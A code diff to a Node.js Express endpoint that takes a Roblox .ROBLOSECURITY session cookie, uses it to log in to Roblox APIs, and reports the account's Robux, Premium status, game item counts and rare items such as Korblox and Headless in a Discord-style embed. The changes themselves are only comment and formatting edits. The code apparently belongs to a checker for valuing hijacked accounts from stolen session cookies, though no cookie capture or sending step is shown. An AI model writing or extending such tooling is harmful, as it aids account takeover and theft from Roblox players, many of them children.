@@ -113,7 +113,7 @@ app.post('/check', async (req, res) => {
     const csrfToken = tokenRes.headers.get('x-csrf-token');
     if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
 
-    // Dane użytkownika
+    // Authenticated user
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -124,7 +124,7 @@ app.post('/check', async (req, res) => {
     if (!userRes.ok) throw new Error('Invalid cookie');
     const userData = await userRes.json();
 
-    // Verified email (hat)
+    // Email verified (hat)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
@@ -266,7 +266,7 @@ app.post('/check', async (req, res) => {
                   inline: false
                 },
                 {
-                  name: "**Info**\n──────────┐",
+                  name: "**Info**\n┌─────────────┐",
                   value:
                     `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
                     `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
@@ -274,7 +274,7 @@ app.post('/check', async (req, res) => {
                   inline: true
                 },
                 {
-                  name: "**Games**\n──────────┐",
+                  name: "**Games**\n┌─────────────┐",
                   value:
                     `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
                     `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
@@ -282,9 +282,9 @@ app.post('/check', async (req, res) => {
                   inline: true
                 },
                 {
-                  name: "**Inventory**\n──────────┐",
+                  name: "**Inventory**\n┌─────────────┐",
                   value:
-                    `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
+                    `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n\n` +
                     `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
                   inline: true
                 }
